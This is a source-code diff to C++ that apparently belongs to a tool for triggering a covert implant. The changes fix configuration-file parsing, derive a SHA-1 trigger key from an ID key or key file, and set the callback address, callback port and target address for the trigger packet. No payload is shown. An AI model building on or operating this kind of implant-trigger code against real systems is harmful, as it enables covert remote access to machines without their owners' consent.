@@ -247,7 +247,7 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 				if (strlen(t_param->idKey) == 0) {
 					cout << "ID Key Filename ? ";
 					cin >> t_param->idKeyFilename;
-					if (access(t_param->idKeyFilename)) {
+					if (access(t_param->idKeyFilename, R_OK)) {
 						perror("Unable to access ID key file.\n");
 						continue;
 					}
@@ -346,17 +346,19 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 		// Get and verify ID key
 
 		triggerFile.getline( t_param->idKey, MAX_INPUT_LEN, delim);
-		if (strlen(t_param->idKey == 0)) {
+		if (strlen(t_param->idKey) == 0) {
 			triggerFile.getline( t_param->idKeyFilename, MAX_INPUT_LEN, delim);
-			if (strlen(t_param->idKeyFilename == 0)) {
+			if (strlen(t_param->idKeyFilename) == 0) {
 				cout << "ERROR: Missing ID key." << endl;
 				return -1;
 			}
-			if (access(t_param->idKeyFilename)) {
+			if (access(t_param->idKeyFilename, R_OK)) {
 				perror("Unable to access ID key file.\n");
 				return -1;
 			}
-		}
+		} else
+			triggerFile.getline( t_param->idKeyFilename, MAX_INPUT_LEN, delim); // Skip over the blank field
+
 		if (strlen(t_param->idKey) < ID_KEY_LENGTH_MIN) {
 			cout << "ID Key length too short (must be at least " << ID_KEY_LENGTH_MIN << " characters)\n" << endl;
 			return -1;
@@ -468,6 +470,7 @@ void Trigger::triggerImplant( Primitive::Activation& actvn, ProcessCmdAccumulato
 {
 
 	ifstream	randomFile;
+	ifstream	idKeyFile;
 	String		*argPtr = (String *)(actvn.arguments);
 	string		triggerFileName = *argPtr;
 	struct params	t_param;
@@ -488,7 +491,7 @@ void Trigger::triggerImplant( Primitive::Activation& actvn, ProcessCmdAccumulato
 	// yes, this isn't a great way, but will quickly satisfy the requirement.
 	// parse_config_only is a global flag to "synchronize" when the trigger is sent.
 	// in the case of trigger+listen, this function is called twice.
-	// this first time it is called is only to obtain the configuration...specifically
+	// the first time it is called is only to obtain the configuration...specifically
 	// the callback port.  the callback port is checked by the caller to make sure
 	// its not in use and application has appropriate permissions to use it before
 	// sending the trigger only to find out later that the port could not be used.
@@ -539,9 +542,22 @@ void Trigger::triggerImplant( Primitive::Activation& actvn, ProcessCmdAccumulato
 	{
 		ti.trigger_type = T_TFTP_WRQ;
 	}
-	ti.callback_port = htons( t_param.callbackPort );
+//	ti.callback_port = htons( t_param.callbackPort );
+	ti.callback_port = t_param.callbackPort;
 	inet_pton( AF_INET, t_param.callbackAddress, &(ti.callback_addr));
 	inet_pton( AF_INET, t_param.targetAddress, &(ti.target_addr));
+
+	// Read and process ID key
+
+	if (strlen(t_param.idKeyFilename)) {
+		if (sha1_file(t_param.idKeyFilename, ti.triggerKey) != 0) {
+			cout << "ERROR: Could not generate trigger key from key file." << endl;
+			return;
+		}
+	} else {
+		sha1((const unsigned char *)t_param.idKey, strlen(t_param.idKey), ti.triggerKey);
+	}
+
 
    //------------Payload----------------
 	memset( &p, 0, sizeof( Payload ) );
